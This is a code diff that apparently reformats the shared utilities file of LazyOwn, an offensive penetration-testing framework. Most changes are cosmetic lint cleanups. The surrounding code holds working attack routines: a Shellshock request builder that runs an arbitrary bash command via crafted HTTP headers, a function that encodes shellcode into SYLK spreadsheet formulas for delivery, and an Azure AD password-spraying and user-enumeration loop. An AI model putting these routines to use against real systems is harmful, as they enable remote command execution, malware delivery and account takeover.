@@ -16,143 +16,121 @@ Description: This file contains the logic for all functions used in the LazyOwnS
 ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
 """
 
-import re
-import os
-import io
-import csv
-import sys
-import ssl
-import gzip
-import json
-import time
-import yaml
-import uuid
+import argparse
+import base64
+import binascii
+import bisect
+import csv  # noqa: F401
+import ctypes  # noqa: F401
+import curses  # noqa: F401
 import glob
+import gzip
+import hashlib  # noqa: F401
+import importlib.util
+import io  # noqa: F401
+import itertools  # noqa: F401
+import json
+import os
+import pickle  # noqa: F401
+import random
+import re
+import readline
 import shlex
 import shutil
-import bisect
-import pickle
 import signal
-import base64
-import curses
-import string
-import ctypes
 import socket
+import ssl  # noqa: F401
+import string
 import struct
-import random
-import hashlib
-import argparse
-import binascii
-import readline
-import requests
-import tempfile
-import itertools
-import threading
 import subprocess
+import sys
+import tempfile
+import threading
+import time
 import urllib.parse
 import urllib.request
-import importlib.util
-from os import urandom
-from io import StringIO
-from pathlib import Path
-from rich.text import Text
-from threading import Timer
-from rich.panel import Panel
-from bs4 import BeautifulSoup
-from itertools import product
-from rich.console import Console
+import uuid  # noqa: F401
 import xml.etree.ElementTree as ET
-from html.parser import HTMLParser
-from concurrent.futures import ThreadPoolExecutor
-from modules.lazyencoder_decoder import encode, decode
-from datetime import datetime, timedelta, date, timezone
-from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import quote, unquote, urlparse, urljoin
-from requests.exceptions import ConnectionError, RequestException
+from concurrent.futures import ThreadPoolExecutor  # noqa: F401
+from datetime import date, datetime, timedelta, timezone  # noqa: F401
+from html.parser import HTMLParser  # noqa: F401
+from http.server import BaseHTTPRequestHandler, HTTPServer  # noqa: F401
+from io import StringIO  # noqa: F401
+from itertools import product  # noqa: F401
+from os import urandom  # noqa: F401
+from pathlib import Path  # noqa: F401
+from threading import Timer  # noqa: F401
+from urllib.parse import quote, unquote, urljoin, urlparse  # noqa: F401
 
-from core.config import Config, PAYLOAD_FILENAME, PAYLOAD_PATH, load_payload, save_payload
-from core.credentials import (
-    crack_password,
-    find_ea,
-    find_ps,
-    find_ss,
-    format_openssh_key,
-    format_rsa_key,
-    generate_emails,
-    get_credentials,
-    get_domain,
-    get_hash,
-    get_users_dic,
-    return_creds,
-    Spray,
+import requests
+import yaml
+from bs4 import BeautifulSoup  # noqa: F401
+from requests.exceptions import ConnectionError, RequestException  # noqa: F401
+from rich.console import Console  # noqa: F401
+from rich.panel import Panel  # noqa: F401
+from rich.text import Text  # noqa: F401
+
+from core.config import PAYLOAD_FILENAME, PAYLOAD_PATH, Config, load_payload, save_payload  # noqa: F401
+from core.console import (  # noqa: F401
+    BG_BLACK,
+    BG_BLUE,
+    BG_BRIGHT_BLACK,
+    BG_BRIGHT_BLUE,
+    BG_BRIGHT_CYAN,
+    BG_BRIGHT_GREEN,
+    BG_BRIGHT_MAGENTA,
+    BG_BRIGHT_RED,
+    BG_BRIGHT_WHITE,
+    BG_BRIGHT_YELLOW,
+    BG_COLOR_256,
+    BG_CYAN,
+    BG_GREEN,
+    BG_MAGENTA,
+    BG_RED,
+    BG_TRUE_COLOR,
+    BG_WHITE,
+    BG_YELLOW,
+    BLACK,
+    BLINK,
+    BLUE,
+    BOLD,
+    BRIGHT_BLACK,
+    BRIGHT_BLUE,
+    BRIGHT_CYAN,
+    BRIGHT_GREEN,
+    BRIGHT_MAGENTA,
+    BRIGHT_RED,
+    BRIGHT_WHITE,
+    BRIGHT_YELLOW,
+    COLOR_256,
+    CYAN,
+    GREEN,
+    INVERT,
+    MAGENTA,
+    RED,
+    RESET,
+    SURROGATE_CHARS,
+    TRANSLATION_TABLE,
+    TRUE_COLOR,
+    UNDERLINE,
+    WHITE,
+    YELLOW,
+    print_error,
+    print_msg,
+    print_succ,
+    print_warn,
 )
-from core.console import (
-    BG_BLACK, BG_BLUE, BG_BRIGHT_BLACK, BG_BRIGHT_BLUE, BG_BRIGHT_CYAN,
-    BG_BRIGHT_GREEN, BG_BRIGHT_MAGENTA, BG_BRIGHT_RED, BG_BRIGHT_WHITE,
-    BG_BRIGHT_YELLOW, BG_COLOR_256, BG_CYAN, BG_GREEN, BG_MAGENTA, BG_RED,
-    BG_TRUE_COLOR, BG_WHITE, BG_YELLOW, BLACK, BLINK, BLUE, BOLD,
-    BRIGHT_BLACK, BRIGHT_BLUE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_MAGENTA,
-    BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW, COLOR_256, CYAN, GREEN, INVERT,
-    MAGENTA, RED, RESET, SURROGATE_CHARS, TRANSLATION_TABLE, TRUE_COLOR,
-    UNDERLINE, WHITE, YELLOW, print_error, print_msg, print_succ, print_warn,
-)
-from core.crypto import AESencrypt, dropFile, generate_xor_key, xor_encrypt_decrypt
-from core.process import (
-    activate_server,
+from core.crypto import AESencrypt, dropFile, generate_xor_key, xor_encrypt_decrypt  # noqa: F401
+from core.dependencies import optional_attr, optional_import
+from core.parsers import strip_ansi  # noqa: F401  # noqa: F401
+from core.process import (  # noqa: F401
     check_go_tool_installed,
     check_sudo,
-    ensure_tmux_session,
     handle_multiple_rhosts,
     is_binary_present,
-    is_package_installed,
-    run,
-    run_command,
 )
-from core.validators import check_lhost, check_lport, check_port, check_rhost
-from core.http import (
-    display_news,
-    exploitalert,
-    generate_http_req,
-    get_command,
-    inject_payloads,
-    nvddb,
-    packetstormsecurity,
-    scrape_news,
-    send_command,
-)
-from core.network import (
-    create_arp_packet,
-    get_banner,
-    get_network_info,
-    get_open_ports,
-    is_port_in_use,
-    parse_ip_mac,
-    parse_proc_net_file,
-    send_packet,
-)
-from core.parsers import (
-    aggressive_yaml_fix,
-    clean_html,
-    clean_output,
-    clean_url,
-    create_synthetic_yaml,
-    de_htmlify,
-    extract_banners,
-    fix_common_yaml_issues,
-    get_domain_from_xml,
-    get_xml,
-    htmlify,
-    is_exist,
-    list_binaries,
-    load_adversary,
-    load_knowledge_base,
-    load_user_aliases,
-    manual_yaml_extraction,
-    parse_nmap_csv,
-    parse_yaml_response,
-    select_binary,
-)
-from core.dependencies import optional_attr, optional_import
+from core.validators import check_lhost, check_lport, check_port, check_rhost  # noqa: F401
+from modules.lazyencoder_decoder import encode  # noqa: F401
 
 # Optional heavy dependencies are bound lazily (see core/dependencies.py) and re-exported to lazyown.py via star import.
 AES = optional_attr("Crypto.Cipher", "AES")
@@ -331,7 +309,6 @@ def parse_ip_mac(input_string):
         print_error("Error: Input must be in the format 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.")
         return None, None
 
-from core.parsers import strip_ansi
 
 def create_arp_packet(src_mac, src_ip, dst_ip, dst_mac):
     """
@@ -1200,8 +1177,8 @@ def generate_http_req(host, port, uri, custom_header=None, cmd=None):
     if cmd:
         payload = f'() {{ :;}}; echo; /bin/bash -c "{cmd}"'
     else:
-        random_string = random_string()
-        payload = f'() {{ :;}}; echo; echo "{random_string}"'
+        nonce = random_string()
+        payload = f'() {{ :;}}; echo; echo "{nonce}"'
 
     headers = {}
     if custom_header is None:
@@ -1220,7 +1197,7 @@ def generate_http_req(host, port, uri, custom_header=None, cmd=None):
     if cmd:
         return response, None
     else:
-        return response, random_string
+        return response, nonce
 
 def format_openssh_key(raw_key):
     """
@@ -1485,7 +1462,7 @@ def get_credentials(file=None, ncred=None):
                 print_error("Invalid selection.")
                 return []
 
-    if file == True:
+    if file:
         return selected_file
 
     credentials = []
@@ -1843,7 +1820,7 @@ def get_hash(dir = None):
         return ""
 
     try:
-        if dir == True:
+        if dir:
             return selected_file
         else:
             with open(selected_file, "r") as file:
@@ -1957,7 +1934,7 @@ def halp():
     print(f"    {GREEN}  --json-output      Emit structured JSON per command (use with --headless).{RESET}")
     print(f"    {GREEN}  --profile <file>   YAML profile overriding payload.json keys.{RESET}")
     print(f"    {GREEN}  --run-chain <cmds> Semicolon-separated command chain (e.g. \"scan; enum\").{RESET}")
-    print(f"")
+    print("")
     print(f"    {CYAN}Headless examples:{RESET}")
     print(f"    {WHITE}  ./run --headless --json-output -c \"nmap_scan\"{RESET}")
     print(f"    {WHITE}  ./run --headless --profile ops.yaml --run-chain \"recon; enum; exploit\"{RESET}")
@@ -2046,27 +2023,27 @@ def get_domain_from_xml(xml_file):
 
 def shellcode_to_sylk(shellcode_path):
 
-	sylk_output = SYLK_TEMPLATE
+    sylk_output = SYLK_TEMPLATE
 
-	charinline = 0
-	cell = 1
+    charinline = 0
+    cell = 1
 
-	with open(shellcode_path, "rb") as f:
-		byte = f.read(1)
-		while byte != b"":
-			if charinline == 0:
-				sylk_output += ("C;X2;Y%s;E" % (str(cell)))
-				cell += 1
-			else:
-				sylk_output+=("&")
-			sylk_output += ("CHAR(" + str(ord(byte)) + ")")
-			byte = f.read(1)
-			charinline += 1
-			if charinline == 20:
-				sylk_output += ("\n")
-				charinline = 0
-	sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
-	return sylk_output
+    with open(shellcode_path, "rb") as f:
+        byte = f.read(1)
+        while byte != b"":
+            if charinline == 0:
+                sylk_output += ("C;X2;Y%s;E" % (str(cell)))
+                cell += 1
+            else:
+                sylk_output+=("&")
+            sylk_output += ("CHAR(" + str(ord(byte)) + ")")
+            byte = f.read(1)
+            charinline += 1
+            if charinline == 20:
+                sylk_output += ("\n")
+                charinline = 0
+    sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
+    return sylk_output
 
 
 def get_banner(ip, port):
@@ -2194,64 +2171,64 @@ def activate_server(httpd, url, lhost):
 
 def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
 
-	results = []
+    results = []
 
-	AD_codes = detailed_codes.keys()
+    AD_codes = detailed_codes.keys()
 
-	if verbose or more_verbose:
-		print("Targeting: " + target_url + "\n")
+    if verbose or more_verbose:
+        print("Targeting: " + target_url + "\n")
 
-	headers = {'Content-Type':'text/xml'}
+    headers = {'Content-Type':'text/xml'}
 
-	for user in users:
-		if more_verbose:
-			print("\ntesting " + user)
-		xml_data = xml_body.substitute(username=user, domain=domain, password=password)
-		r = requests.post(target_url, data=xml_data)
+    for user in users:
+        if more_verbose:
+            print("\ntesting " + user)
+        xml_data = xml_body.substitute(username=user, domain=domain, password=password)
+        r = requests.post(target_url, data=xml_data)
 
-		if more_verbose:
-			print("Status: " + str(r.status_code))
+        if more_verbose:
+            print("Status: " + str(r.status_code))
 
-		if 'ThrottleStatus' in r.headers.keys():
-			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))
+        if 'ThrottleStatus' in r.headers.keys():
+            print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))
 
-		if 'IfExistsResult' in r.content.decode('UTF-8'):
-			print(r.content)
-			sys.exit()
+        if 'IfExistsResult' in r.content.decode('UTF-8'):
+            print(r.content)
+            sys.exit()
 
-		if r.status_code == 200:
-			results.append([user + '@' + domain, 'Success', password])
-			if verbose:
-				print(user + "@" + domain + "\t\t:: " + password)
-			continue
+        if r.status_code == 200:
+            results.append([user + '@' + domain, 'Success', password])
+            if verbose:
+                print(user + "@" + domain + "\t\t:: " + password)
+            continue
 
-		for code in AD_codes:
-			if code in r.content.decode('UTF-8'):
-				if code == 'AADSTS50034':
-					results.append([user + "@" + domain, code, 'NOUSER'])
-				else:
-					results.append([user + "@" + domain, code, 'User Exists'])
-				if more_verbose:
-					print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
-				break
-		time.sleep(wait)
+        for code in AD_codes:
+            if code in r.content.decode('UTF-8'):
+                if code == 'AADSTS50034':
+                    results.append([user + "@" + domain, code, 'NOUSER'])
+                else:
+                    results.append([user + "@" + domain, code, 'User Exists'])
+                if more_verbose:
+                    print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
+                break
+        time.sleep(wait)
 
-	return results
+    return results
 
 
 def ProcessResults(results, outfile):
 
-	for result in results:
-		if result[1] == 'Success':
-			outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
-		else:
-			continue
+    for result in results:
+        if result[1] == 'Success':
+            outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
+        else:
+            continue
 
-	for result in results:
-		if result[1] == 'Success':
-			continue
-		else:
-			outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
+    for result in results:
+        if result[1] == 'Success':
+            continue
+        else:
+            outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
 
 def generate_index(repo_dir):
     """
@@ -2715,7 +2692,7 @@ def manual_yaml_extraction(content):
     Fallback method to manually extract YAML data from malformed content
     """
     import re
-    import yaml
+
 
     result = {}
     lines = content.split('\n')
